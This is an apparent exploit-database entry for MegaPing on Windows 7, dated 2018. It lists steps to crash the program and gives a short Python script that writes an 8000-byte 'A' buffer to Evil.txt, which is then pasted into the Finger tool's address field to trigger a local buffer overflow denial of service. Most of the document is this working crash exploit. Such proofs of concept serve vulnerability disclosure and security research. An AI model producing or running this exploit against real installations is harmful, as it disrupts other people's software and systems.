# Exploit Title: MegaPing
# Date: 15-12-2018 
# Vendor Homepage: http://www.magnetosoft.com/
# Software Link:   http://www.magnetosoft.com/downloads/win32/megaping_setup.exe
# Exploit Author: Achilles
# Tested Version: 
# Tested on: Windows 7 x64
# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
 
# Steps to Produce the Crash: 
# 1.- Run python code : MegaPing.py
# 2.- Open EVIL.txt and copy content to clipboard
# 3.- Open MegaPing choose from the left side: 'Finger'
# 4.- Paste the content of EVIL.txt into the field: 'Destination Address List'
# 5.- Click 'Start' and you will see a crash.

#!/usr/bin/env python

buffer = "\x41" * 8000

try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except:
	print "File cannot be created"